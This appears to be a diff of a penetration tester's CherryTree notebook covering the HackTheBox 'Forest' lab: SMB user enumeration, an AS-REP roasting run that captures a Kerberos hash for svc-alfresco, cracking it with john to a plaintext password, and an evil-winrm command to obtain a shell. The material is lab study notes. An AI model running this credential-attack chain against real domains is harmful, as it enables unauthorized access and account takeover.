@@ -88,58 +88,65 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 72.08 seconds
 </codebox>
       </node>
-      <node name="Enum4Linux" unique_id="100" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696025692" ts_lastsave="1696109903">
-        <rich_text></rich_text>
+      <node name="Enum4Linux" unique_id="100" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696025692" ts_lastsave="1696365064">
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+get all the users using </rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+</rich_text>
         <codebox char_offset="0" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Sep 30 06:54:59 2023
 
-[34m =========================================( [0m[32mTarget Information[0m[34m )=========================================
+[34m =========================================( [0m[32mTarget Information[0m[34m )=========================================
 
-[0mTarget ........... 10.10.10.161
+[0mTarget ........... 10.10.10.161
 RID Range ........ 500-550,1000-1050
 Username ......... ''
 Password ......... ''
 Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
 
 
-[34m ============================( [0m[32mEnumerating Workgroup/Domain on 10.10.10.161[0m[34m )============================
+[34m ============================( [0m[32mEnumerating Workgroup/Domain on 10.10.10.161[0m[34m )============================
 
-[0m[33m
-[E] [0m[31mCan't find workgroup/domain
+[0m[33m
+[E] [0m[31mCan't find workgroup/domain
 
-[0m
+[0m
 
-[34m ================================( [0m[32mNbtstat Information for 10.10.10.161[0m[34m )================================
+[34m ================================( [0m[32mNbtstat Information for 10.10.10.161[0m[34m )================================
 
-[0mLooking up status of 10.10.10.161
+[0mLooking up status of 10.10.10.161
 No reply from 10.10.10.161
 
-[34m ===================================( [0m[32mSession Check on 10.10.10.161[0m[34m )===================================
+[34m ===================================( [0m[32mSession Check on 10.10.10.161[0m[34m )===================================
 
-[0m[33m
-[+] [0m[32mServer 10.10.10.161 allows sessions using username '', password ''
+[0m[33m
+[+] [0m[32mServer 10.10.10.161 allows sessions using username '', password ''
 
-[0m
-[34m ================================( [0m[32mGetting domain SID for 10.10.10.161[0m[34m )================================
+[0m
+[34m ================================( [0m[32mGetting domain SID for 10.10.10.161[0m[34m )================================
 
-[0mDomain Name: HTB
+[0mDomain Name: HTB
 Domain Sid: S-1-5-21-3072663084-364016917-1341370565
-[33m
-[+] [0m[32mHost is part of a domain (not a workgroup)
+[33m
+[+] [0m[32mHost is part of a domain (not a workgroup)
 
-[0m
-[34m ===================================( [0m[32mOS information on 10.10.10.161[0m[34m )===================================
+[0m
+[34m ===================================( [0m[32mOS information on 10.10.10.161[0m[34m )===================================
 
-[0m[33m
-[E] [0m[31mCan't get OS info with smbclient
+[0m[33m
+[E] [0m[31mCan't get OS info with smbclient
 
-[0m[33m
-[+] [0m[32mGot OS info for 10.10.10.161 from srvinfo: 
-[0mdo_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
+[0m[33m
+[+] [0m[32mGot OS info for 10.10.10.161 from srvinfo: 
+[0mdo_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
 
 
-[34m =======================================( [0m[32mUsers on 10.10.10.161[0m[34m )=======================================
+[34m =======================================( [0m[32mUsers on 10.10.10.161[0m[34m )=======================================
 
-[0mindex: 0x2137 RID: 0x463 acb: 0x00020015 Account: $331000-VK4ADACQNUCA	Name: (null)	Desc: (null)
+[0mindex: 0x2137 RID: 0x463 acb: 0x00020015 Account: $331000-VK4ADACQNUCA	Name: (null)	Desc: (null)
 index: 0xfbc RID: 0x1f4 acb: 0x00000010 Account: Administrator	Name: Administrator	Desc: Built-in account for administering the computer/domain
 index: 0x2369 RID: 0x47e acb: 0x00000210 Account: andy	Name: Andy Hislip	Desc: (null)
 index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount	Name: (null)	Desc: A user account managed by the system.
@@ -203,21 +210,21 @@ user:[andy] rid:[0x47e]
 user:[mark] rid:[0x47f]
 user:[santi] rid:[0x480]
 
-[34m =================================( [0m[32mShare Enumeration on 10.10.10.161[0m[34m )=================================
+[34m =================================( [0m[32mShare Enumeration on 10.10.10.161[0m[34m )=================================
 
-[0mdo_connect: Connection to 10.10.10.161 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+[0mdo_connect: Connection to 10.10.10.161 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
 
 	Sharename       Type      Comment
 	---------       ----      -------
 Reconnecting with SMB1 for workgroup listing.
 Unable to connect with SMB1 -- no workgroup available
-[33m
-[+] [0m[32mAttempting to map shares on 10.10.10.161
+[33m
+[+] [0m[32mAttempting to map shares on 10.10.10.161
 
-[0m
-[34m ============================( [0m[32mPassword Policy Information for 10.10.10.161[0m[34m )============================
+[0m
+[34m ============================( [0m[32mPassword Policy Information for 10.10.10.161[0m[34m )============================
 
-[0m
+[0m
 
 [+] Attaching to 10.10.10.161 using a NULL share
 
@@ -253,20 +260,20 @@ Unable to connect with SMB1 -- no workgroup available
 	[+] Forced Log off Time: Not Set
 
 
-[33m
-[+] [0m[32mRetieved partial password policy with rpcclient:
+[33m
+[+] [0m[32mRetieved partial password policy with rpcclient:
 
 
-[0mPassword Complexity: Disabled
+[0mPassword Complexity: Disabled
 Minimum Password Length: 7
 
 
-[34m =======================================( [0m[32mGroups on 10.10.10.161[0m[34m )=======================================
+[34m =======================================( [0m[32mGroups on 10.10.10.161[0m[34m )=======================================
 
-[0m[33m
-[+] [0m[32mGetting builtin groups:
+[0m[33m
+[+] [0m[32mGetting builtin groups:
 
-[0mgroup:[Account Operators] rid:[0x224]
+[0mgroup:[Account Operators] rid:[0x224]
 group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
 group:[Incoming Forest Trust Builders] rid:[0x22d]
 group:[Windows Authorization Access Group] rid:[0x230]
@@ -295,34 +302,34 @@ group:[Remote Management Users] rid:[0x244]
 group:[System Managed Accounts Group] rid:[0x245]
 group:[Storage Replica Administrators] rid:[0x246]
 group:[Server Operators] rid:[0x225]
-[33m
-[+] [0m[32m Getting builtin group memberships:
+[33m
+[+] [0m[32m Getting builtin group memberships:
 
-[0m[35mGroup: [0mAdministrators' (RID: 544) has member: Couldn't lookup SIDs
-[35mGroup: [0mSystem Managed Accounts Group' (RID: 581) has member: Couldn't lookup SIDs
-[35mGroup: [0mAccount Operators' (RID: 548) has member: Couldn't lookup SIDs
-[35mGroup: [0mIIS_IUSRS' (RID: 568) has member: Couldn't lookup SIDs
-[35mGroup: [0mWindows Authorization Access Group' (RID: 560) has member: Couldn't lookup SIDs
-[35mGroup: [0mRemote Management Users' (RID: 580) has member: Couldn't lookup SIDs
-[35mGroup: [0mPre-Windows 2000 Compatible Access' (RID: 554) has member: Couldn't lookup SIDs
-[35mGroup: [0mUsers' (RID: 545) has member: Couldn't lookup SIDs
-[35mGroup: [0mGuests' (RID: 546) has member: Couldn't lookup SIDs
-[33m
-[+] [0m[32m Getting local groups:
+[0m[35mGroup: [0mAdministrators' (RID: 544) has member: Couldn't lookup SIDs
+[35mGroup: [0mSystem Managed Accounts Group' (RID: 581) has member: Couldn't lookup SIDs
+[35mGroup: [0mAccount Operators' (RID: 548) has member: Couldn't lookup SIDs
+[35mGroup: [0mIIS_IUSRS' (RID: 568) has member: Couldn't lookup SIDs
+[35mGroup: [0mWindows Authorization Access Group' (RID: 560) has member: Couldn't lookup SIDs
+[35mGroup: [0mRemote Management Users' (RID: 580) has member: Couldn't lookup SIDs
+[35mGroup: [0mPre-Windows 2000 Compatible Access' (RID: 554) has member: Couldn't lookup SIDs
+[35mGroup: [0mUsers' (RID: 545) has member: Couldn't lookup SIDs
+[35mGroup: [0mGuests' (RID: 546) has member: Couldn't lookup SIDs
+[33m
+[+] [0m[32m Getting local groups:
 
-[0mgroup:[Cert Publishers] rid:[0x205]
+[0mgroup:[Cert Publishers] rid:[0x205]
 group:[RAS and IAS Servers] rid:[0x229]
 group:[Allowed RODC Password Replication Group] rid:[0x23b]
 group:[Denied RODC Password Replication Group] rid:[0x23c]
 group:[DnsAdmins] rid:[0x44d]
-[33m
-[+] [0m[32m Getting local group memberships:
+[33m
+[+] [0m[32m Getting local group memberships:
 
-[0m[35mGroup: [0mDenied RODC Password Replication Group' (RID: 572) has member: Couldn't lookup SIDs
-[33m
-[+] [0m[32m Getting domain groups:
+[0m[35mGroup: [0mDenied RODC Password Replication Group' (RID: 572) has member: Couldn't lookup SIDs
+[33m
+[+] [0m[32m Getting domain groups:
 
-[0mgroup:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
+[0mgroup:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
 group:[Domain Admins] rid:[0x200]
 group:[Domain Users] rid:[0x201]
 group:[Domain Guests] rid:[0x202]
@@ -360,71 +367,78 @@ group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]
 group:[Service Accounts] rid:[0x47c]
 group:[Privileged IT Accounts] rid:[0x47d]
 group:[test] rid:[0x13ed]
-[33m
-[+] [0m[32m Getting domain group memberships:
+[33m
+[+] [0m[32m Getting domain group memberships:
 
-[0m[35mGroup: [0m'Domain Computers' (RID: 515) has member: HTB\EXCH01$
-[35mGroup: [0m'Privileged IT Accounts' (RID: 1149) has member: HTB\Service Accounts
-[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\Administrator
-[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\DefaultAccount
-[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\krbtgt
-[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\$331000-VK4ADACQNUCA
-[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\SM_2c8eef0a09b545acb
-[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\SM_ca8c2ed5bdab4dc9b
-[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\SM_75a538d3025e4db9a
-[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\SM_681f53d4942840e18
-[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\SM_1b41c9286325456bb
-[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\SM_9b69f1b9d2cc45549
-[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\SM_7c96b981967141ebb
-[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\SM_c75ee099d0a64c91b
-[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\SM_1ffab36a2f5f479cb
-[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\HealthMailboxc3d7722
-[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\HealthMailboxfc9daad
-[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\HealthMailboxc0a90c9
-[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\HealthMailbox670628e
-[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\HealthMailbox968e74d
-[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\HealthMailbox6ded678
-[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\HealthMailbox83d6781
-[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\HealthMailboxfd87238
-[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\HealthMailboxb01ac64
-[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\HealthMailbox7108a4e
-[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\HealthMailbox0659cc1
-[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\sebastien
-[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\lucinda
-[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\svc-alfresco
-[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\andy
-[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\mark
-[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\santi
-[35mGroup: [0m'Domain Controllers' (RID: 516) has member: HTB\FOREST$
-[35mGroup: [0m'Exchange Trusted Subsystem' (RID: 1119) has member: HTB\EXCH01$
-[35mGroup: [0m'Service Accounts' (RID: 1148) has member: HTB\svc-alfresco
-[35mGroup: [0m'Enterprise Admins' (RID: 519) has member: HTB\Administrator
-[35mGroup: [0m'$D31000-NSEL5BRJ63V7' (RID: 1133) has member: HTB\EXCH01$
-[35mGroup: [0m'Managed Availability Servers' (RID: 1120) has member: HTB\EXCH01$
-[35mGroup: [0m'Managed Availability Servers' (RID: 1120) has member: HTB\Exchange Servers
-[35mGroup: [0m'Exchange Windows Permissions' (RID: 1121) has member: HTB\Exchange Trusted Subsystem
-[35mGroup: [0m'Group Policy Creator Owners' (RID: 520) has member: HTB\Administrator
-[35mGroup: [0m'Domain Guests' (RID: 514) has member: HTB\Guest
-[35mGroup: [0m'Schema Admins' (RID: 518) has member: HTB\Administrator
-[35mGroup: [0m'Exchange Servers' (RID: 1118) has member: HTB\EXCH01$
-[35mGroup: [0m'Exchange Servers' (RID: 1118) has member: HTB\$D31000-NSEL5BRJ63V7
-[35mGroup: [0m'Organization Management' (RID: 1104) has member: HTB\Administrator
-[35mGroup: [0m'Domain Admins' (RID: 512) has member: HTB\Administrator
+[0m[35mGroup: [0m'Domain Computers' (RID: 515) has member: HTB\EXCH01$
+[35mGroup: [0m'Privileged IT Accounts' (RID: 1149) has member: HTB\Service Accounts
+[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\Administrator
+[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\DefaultAccount
+[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\krbtgt
+[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\$331000-VK4ADACQNUCA
+[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\SM_2c8eef0a09b545acb
+[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\SM_ca8c2ed5bdab4dc9b
+[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\SM_75a538d3025e4db9a
+[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\SM_681f53d4942840e18
+[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\SM_1b41c9286325456bb
+[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\SM_9b69f1b9d2cc45549
+[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\SM_7c96b981967141ebb
+[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\SM_c75ee099d0a64c91b
+[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\SM_1ffab36a2f5f479cb
+[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\HealthMailboxc3d7722
+[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\HealthMailboxfc9daad
+[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\HealthMailboxc0a90c9
+[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\HealthMailbox670628e
+[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\HealthMailbox968e74d
+[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\HealthMailbox6ded678
+[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\HealthMailbox83d6781
+[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\HealthMailboxfd87238
+[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\HealthMailboxb01ac64
+[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\HealthMailbox7108a4e
+[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\HealthMailbox0659cc1
+[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\sebastien
+[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\lucinda
+[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\svc-alfresco
+[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\andy
+[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\mark
+[35mGroup: [0m'Domain Users' (RID: 513) has member: HTB\santi
+[35mGroup: [0m'Domain Controllers' (RID: 516) has member: HTB\FOREST$
+[35mGroup: [0m'Exchange Trusted Subsystem' (RID: 1119) has member: HTB\EXCH01$
+[35mGroup: [0m'Service Accounts' (RID: 1148) has member: HTB\svc-alfresco
+[35mGroup: [0m'Enterprise Admins' (RID: 519) has member: HTB\Administrator
+[35mGroup: [0m'$D31000-NSEL5BRJ63V7' (RID: 1133) has member: HTB\EXCH01$
+[35mGroup: [0m'Managed Availability Servers' (RID: 1120) has member: HTB\EXCH01$
+[35mGroup: [0m'Managed Availability Servers' (RID: 1120) has member: HTB\Exchange Servers
+[35mGroup: [0m'Exchange Windows Permissions' (RID: 1121) has member: HTB\Exchange Trusted Subsystem
+[35mGroup: [0m'Group Policy Creator Owners' (RID: 520) has member: HTB\Administrator
+[35mGroup: [0m'Domain Guests' (RID: 514) has member: HTB\Guest
+[35mGroup: [0m'Schema Admins' (RID: 518) has member: HTB\Administrator
+[35mGroup: [0m'Exchange Servers' (RID: 1118) has member: HTB\EXCH01$
+[35mGroup: [0m'Exchange Servers' (RID: 1118) has member: HTB\$D31000-NSEL5BRJ63V7
+[35mGroup: [0m'Organization Management' (RID: 1104) has member: HTB\Administrator
+[35mGroup: [0m'Domain Admins' (RID: 512) has member: HTB\Administrator
 
-[34m ==================( [0m[32mUsers on 10.10.10.161 via RID cycling (RIDS: 500-550,1000-1050)[0m[34m )==================
+[34m ==================( [0m[32mUsers on 10.10.10.161 via RID cycling (RIDS: 500-550,1000-1050)[0m[34m )==================
 
-[0m[33m
-[E] [0m[31mCouldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
+[0m[33m
+[E] [0m[31mCouldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
 
-[0m
-[34m ===============================( [0m[32mGetting printer info for 10.10.10.161[0m[34m )===============================
+[0m
+[34m ===============================( [0m[32mGetting printer info for 10.10.10.161[0m[34m )===============================
 
-[0mdo_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED
+[0mdo_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED
 
 
 enum4linux complete on Sat Sep 30 06:59:24 2023
 
 </codebox>
+        <codebox char_offset="27" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> grep 'user' enum4linux_vanilla.log | cut -d ']' -f 1 | cut -d '[' -f2   </codebox>
+        <codebox char_offset="30" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sebastien
+lucinda
+svc-alfresco
+andy
+mark
+santi</codebox>
       </node>
       <node name="ldapVanilla" unique_id="102" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696071868" ts_lastsave="1696109897">
         <rich_text justification="left"></rich_text>
@@ -434,9 +448,12 @@ enum4linux complete on Sat Sep 30 06:59:24 2023
 
 Users identified
 
- or
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text> or
 
 </rich_text>
+        <rich_text justification="left"></rich_text>
         <codebox char_offset="0" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"># extended LDIF
 #
 # LDAPv3
@@ -11213,46 +11230,44 @@ userPrincipalName: andy@htb.local
 userPrincipalName: mark@htb.local
 </codebox>
       </node>
-      <node name="AS-RepRoasting" unique_id="103" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696109917" ts_lastsave="1696111201">
+      <node name="AS-RepRoasting" unique_id="103" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696109917" ts_lastsave="1696369312">
         <rich_text>
 
 
-using kerberoast
+we can use this hash to get the password for user using john the ripper
 
+
+
+now use evil-winrm to get a shell:
+
+evil-winrm -i 10.10.10.161 -u </rich_text>
+        <rich_text foreground="#9755b3">svc</rich_text>
+        <rich_text>-alfresc -p </rich_text>
+        <rich_text foreground="#5ebdab">"s3rvice"</rich_text>
+        <rich_text> -s .
 </rich_text>
         <codebox char_offset="0" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">                                                                                                                                                                            
  Forest  impacket-GetNPUsers htb.local/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
 Impacket v0.11.0 - Copyright 2023 Fortra
 
-[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
 [-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
 [-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:8fae37b219f0fa81f40e2216927ebe26$3944374fd1f5ea4fa576e9c84bed97fb4c778c193922baf4017db9b8f8d9abdd87b75f501c928437d9f0977ac12ac4dec972284d54d048b4c204d22d16d7005d2746761f2a669938e6678e27da72ec0ea397469557a97d5fed8c9f60562dba1771978a3c09bc3ebcec2e33e4c5095ced0bbe5092652726130cd600b27d8d049ed31c5b335fbab461db36709136136fde247153b5db737601a23a1a328232b93f7c0dc716c21f3452b8b00a6b89884f3fa88c9707068518b53ab902c289888f02569911d4ed542df6e4d4f9bc62a78c577319e5be60356848d2fd08768a190f128faab2bb93dd
 [-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
 [-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
 </codebox>
-        <codebox char_offset="22" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
-
-kerbrute userenum -d htb.local --dc 10.10.10.161 usernames.txt
-
-    __             __               __     
-   / /_____  _____/ /_  _______  __/ /____ 
-  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
- / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
-/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
-
-Version: dev (n/a) - 09/30/23 - Ronnie Flathers @ropnop
-
-2023/09/30 17:59:32 &gt;  Using KDC(s):
-2023/09/30 17:59:32 &gt;   10.10.10.161:88
-
-2023/09/30 17:59:32 &gt;  [+] VALID USERNAME:       mark@htb.local
-2023/09/30 17:59:32 &gt;  [+] VALID USERNAME:       sebastien@htb.local
-2023/09/30 17:59:32 &gt;  [+] VALID USERNAME:       santi@htb.local
-2023/09/30 17:59:32 &gt;  [+] VALID USERNAME:       lucinda@htb.local
-2023/09/30 17:59:32 &gt;  [+] VALID USERNAME:       andy@htb.local
-2023/09/30 17:59:32 &gt;  Done! Tested 6 usernames (5 valid) in 0.111 seconds
-                                                                               </codebox>
+        <codebox char_offset="77" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">                                                                                                                                                                            
+ Forest  john --wordlist=/usr/share/wordlists/rockyou.txt hashes.asreproast
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
+Will run 5 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)     
+1g 0:00:00:02 DONE (2023-10-03 17:22) 0.3597g/s 1469Kp/s 1469Kc/s 1469KC/s s4885119..s3r2s1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+</codebox>
       </node>
     </node>
     <node name="Exploitation" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1500474629">
@@ -12739,7 +12754,7 @@ ________________________________________________________________________________
 
 crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq</codebox>
           <codebox char_offset="114" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0"></codebox>
-          <node name="ASRreproasting" unique_id="90" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687808714" ts_lastsave="1687808763">
+          <node name="ASRreproasting" unique_id="90" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687808714" ts_lastsave="1696368083">
             <rich_text scale="h1">Request AS_REP message</rich_text>
             <rich_text>
 
@@ -12760,7 +12775,7 @@ or
 
 </rich_text>
             <codebox char_offset="41" justification="left" frame_width="1810" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">#Try all the usernames in usernames.txt
-python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
+impacket-GetNPUsers htb.local/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
 #Use domain creds to extract targets and target them
 python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
 
@@ -12771,7 +12786,7 @@ impacket-GetNPUsers spookysec.local/svc-admin -no-pass
 
 or
 
-python3 /opt/impacket/examples/GetNPUsers.py domain.local/admin -request -no-pass -dc-ip 10.10.10.161
+impacket-GetNPUsers htb.local/admin -request -no-pass -dc-ip 10.10.10.161
 </codebox>
             <codebox char_offset="48" justification="left" frame_width="1682" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
 Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)</codebox>
@@ -13692,7 +13707,7 @@ Reference:
           <rich_text>
 </rich_text>
         </node>
-        <node name="evilwinrm" unique_id="95" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689286530" ts_lastsave="1690067048">
+        <node name="evilwinrm" unique_id="95" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689286530" ts_lastsave="1696369280">
           <rich_text>
 </rich_text>
           <rich_text justification="left"></rich_text>
@@ -13738,7 +13753,7 @@ References:
           <codebox char_offset="1" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -u '&lt;user&gt;' -p &lt;password&gt; -i 10.10.10.161</codebox>
           <codebox char_offset="8" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.10.10.161 -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f8</codebox>
           <codebox char_offset="79" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&lt;hash not to use&gt;:&lt;hash to actually use&gt;</codebox>
-          <codebox char_offset="201" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.10.10.161 -u anirudh -p "SecureHM" -s .</codebox>
+          <codebox char_offset="201" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.10.10.161 -u anirudh -p "s3rvice" -s .</codebox>
         </node>
         <node name="URI File Attack" unique_id="98" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690061701" ts_lastsave="1690061750">
           <rich_text>
